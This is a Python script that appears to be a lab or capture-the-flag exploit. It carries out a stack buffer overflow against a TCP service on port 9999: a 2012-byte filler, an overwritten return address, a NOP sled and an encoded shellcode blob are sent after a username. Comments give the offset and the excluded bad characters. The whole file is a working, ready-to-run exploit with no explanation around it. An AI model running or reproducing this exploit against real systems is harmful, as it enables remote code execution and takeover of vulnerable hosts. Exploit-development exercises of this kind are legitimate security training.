#!/usr/bin/python3

import sys, socket, struct
from time import sleep

host = '10.10.2.63'
port = 9999


# [*] Exact match at offset 2012
# Badchars: 00 0a 0d
# Removed: 00 0a 0d
# 0x625014df

buf =  b""
buf += b"\xb8\x9c\x22\x75\x34\xd9\xe5\xd9\x74\x24\xf4\x5d\x29"
buf += b"\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\xd9\x2c\x97"
buf += b"\xc1\x1d\xd8\xd5\x2a\xdd\x19\xba\xa3\x38\x28\xfa\xd0"
buf += b"\x49\x1b\xca\x93\x1f\x90\xa1\xf6\x8b\x23\xc7\xde\xbc"
buf += b"\x84\x62\x39\xf3\x15\xde\x79\x92\x95\x1d\xae\x74\xa7"
buf += b"\xed\xa3\x75\xe0\x10\x49\x27\xb9\x5f\xfc\xd7\xce\x2a"
buf += b"\x3d\x5c\x9c\xbb\x45\x81\x55\xbd\x64\x14\xed\xe4\xa6"
buf += b"\x97\x22\x9d\xee\x8f\x27\x98\xb9\x24\x93\x56\x38\xec"
buf += b"\xed\x97\x97\xd1\xc1\x65\xe9\x16\xe5\x95\x9c\x6e\x15"
buf += b"\x2b\xa7\xb5\x67\xf7\x22\x2d\xcf\x7c\x94\x89\xf1\x51"
buf += b"\x43\x5a\xfd\x1e\x07\x04\xe2\xa1\xc4\x3f\x1e\x29\xeb"
buf += b"\xef\x96\x69\xc8\x2b\xf2\x2a\x71\x6a\x5e\x9c\x8e\x6c"
buf += b"\x01\x41\x2b\xe7\xac\x96\x46\xaa\xb8\x5b\x6b\x54\x39"
buf += b"\xf4\xfc\x27\x0b\x5b\x57\xaf\x27\x14\x71\x28\x47\x0f"
buf += b"\xc5\xa6\xb6\xb0\x36\xef\x7c\xe4\x66\x87\x55\x85\xec"
buf += b"\x57\x59\x50\xa2\x07\xf5\x0b\x03\xf7\xb5\xfb\xeb\x1d"
buf += b"\x3a\x23\x0b\x1e\x90\x4c\xa6\xe5\x73\x79\x3c\xf6\xda"
buf += b"\x15\x40\xf8\xdd\x5e\xcd\x1e\xb7\xb0\x98\x89\x20\x28"
buf += b"\x81\x41\xd0\xb5\x1f\x2c\xd2\x3e\xac\xd1\x9d\xb6\xd9"
buf += b"\xc1\x4a\x37\x94\xbb\xdd\x48\x02\xd3\x82\xdb\xc9\x23"
buf += b"\xcc\xc7\x45\x74\x99\x36\x9c\x10\x37\x60\x36\x06\xca"
buf += b"\xf4\x71\x82\x11\xc5\x7c\x0b\xd7\x71\x5b\x1b\x21\x79"
buf += b"\xe7\x4f\xfd\x2c\xb1\x39\xbb\x86\x73\x93\x15\x74\xda"
buf += b"\x73\xe3\xb6\xdd\x05\xec\x92\xab\xe9\x5d\x4b\xea\x16"
buf += b"\x51\x1b\xfa\x6f\x8f\xbb\x05\xba\x0b\xdb\xe7\x6e\x66"
buf += b"\x74\xbe\xfb\xcb\x19\x41\xd6\x08\x24\xc2\xd2\xf0\xd3"
buf += b"\xda\x97\xf5\x98\x5c\x44\x84\xb1\x08\x6a\x3b\xb1\x18"

eip = struct.pack('<I', 0x625014df)

nop_sled = b"\x90" * 20

payload = b'A' * 2012 + eip + nop_sled + buf

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	s.send(b'testuser' + b'\n')
	s.recv(1024)
	s.send(payload + b'\n')
	s.close()

except:
	raise Exception('Error unable to connect to server')
	sys.exit
